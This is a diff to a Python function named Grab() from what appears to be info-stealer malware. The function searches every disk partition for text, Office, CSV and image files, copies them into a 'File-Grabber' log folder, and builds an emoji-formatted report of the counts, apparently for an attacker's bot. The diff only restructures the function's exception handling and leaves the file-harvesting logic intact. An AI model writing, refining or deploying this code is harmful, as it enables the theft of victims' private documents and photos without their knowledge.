@@ -28,39 +28,33 @@ def Grab():
     msgInfo = ""
     chdir("C:")
     try:
-        try:
-            makedirs(join(config.pathToLogs, "Files", "File-Grabber", exist_ok=True))
-        except:
-            pass
-        try:
-            Log("===========File-grabber===========")
-            msgInfo +="\n\n\n<b>📁File-grabber📁</b>"
+        makedirs(join(config.pathToLogs, "Files", "File-Grabber", exist_ok=True))
+        Log("===========File-grabber===========")
+        msgInfo +="\n\n\n<b>📁File-grabber📁</b>"
 
-            filesGrab = [
-                ["**\\*.txt", 0],
-                ["**\\*.docx", 0],
-                ["**\\*.csv", 0],
-                ["**\\*.xlsx", 0],
-                ["**\\*.png", 0],
-                ["**\\*.jpg", 0],
-                ["**\\*.jpeg", 0],
-            ]
+        filesGrab = [
+            ["**\\*.txt", 0],
+            ["**\\*.docx", 0],
+            ["**\\*.csv", 0],
+            ["**\\*.xlsx", 0],
+            ["**\\*.png", 0],
+            ["**\\*.jpg", 0],
+            ["**\\*.jpeg", 0],
+        ]
 
-            drives = disk_partitions()
-            for drive in drives:
-                    for i in range(len(filesGrab)):
-                        try:
-                            pathes = list(str(_) for _ in Path(drive.device).glob(filesGrab[i][0]))
-                        except Exception as e:
-                            Log(drive+" search "+e)
-                        try:
-                            filesGrab[i][1]= Copy(pathes,filesGrab[i][0],filesGrab[i][1])
-                        except Exception as e:
-                            Log(drive+" copy "+e)
-            for i in range(len(filesGrab)):
-                msgInfo +=f"\n∟📄files{filesGrab[i][0][4:]}: {filesGrab[i][1]}"
-            return msgInfo
-        except:
-            return msgInfo
+        drives = disk_partitions()
+        for drive in drives:
+                for i in range(len(filesGrab)):
+                    try:
+                        pathes = list(str(_) for _ in Path(drive.device).glob(filesGrab[i][0]))
+                    except Exception as e:
+                        Log(drive+" search "+e)
+                    try:
+                        filesGrab[i][1]= Copy(pathes,filesGrab[i][0],filesGrab[i][1])
+                    except Exception as e:
+                        Log(drive+" copy "+e)
+        for i in range(len(filesGrab)):
+            msgInfo +=f"\n∟📄files{filesGrab[i][0][4:]}: {filesGrab[i][1]}"
+        return msgInfo
     except:
-            return msgInfo
+        return msgInfo
